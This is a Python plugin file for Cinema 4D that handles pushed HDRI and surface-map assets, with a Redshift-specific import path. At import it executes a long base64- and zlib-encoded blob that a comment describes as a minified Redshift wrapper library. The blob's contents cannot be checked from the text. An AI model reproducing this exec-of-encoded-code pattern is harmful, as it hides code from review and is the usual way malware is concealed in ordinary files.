import c4d
import assetexchange_shared
import assetexchange_c4d
from . import importer

import zlib, base64
exec(zlib.decompress(base64.b64decode('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')))
# RedshifftWrapper 1.1 minified (https://github.com/gr4ph0s/C4D_RedshiftWrapper_API)

REDSHIFT_ID = 1036219

class AssetPushService(assetexchange_shared.server.AssetPushServiceInterface):
    # lists all supported asset types which can be pushed here
    def SupportedTypes(self, _):
        return [
            'environment.hdri',
            'mesh+surface.maps',
            'surface.maps',
        ]

    # checks if specific asset can be pushed here
    def PushAllowed(self, asset):
        return True

    # asset gets pushed here
    # @assetexchange_c4d.execute_on_main_thread
    def Push(self, data):
        #Adding 'doc' to scope!
        doc = c4d.documents.GetActiveDocument()
        rd = doc.GetActiveRenderData()

        if rd[c4d.RDATA_RENDERENGINE] == REDSHIFT_ID:
            rs = Redshift()
            if rs is False:
                return
            if data['asset']['typeUid'] == 'environment.hdri':
                importer.environment_hdri_redshift(doc, data['asset'], data['selectedVariants'])
                return True
            if data['asset']['typeUid'] == 'surface.maps':
                importer.surface_maps_redshift(rs, doc, data['asset'], data['selectedVariants'])
                return True

        if data['asset']['typeUid'] == 'environment.hdri':
            importer.environment_hdri(doc, data['asset'], data['selectedVariants'])
            return True
        if data['asset']['typeUid'] == 'surface.maps':
            importer.surface_maps(doc, data['asset'], data['selectedVariants'])
            return True

        return False
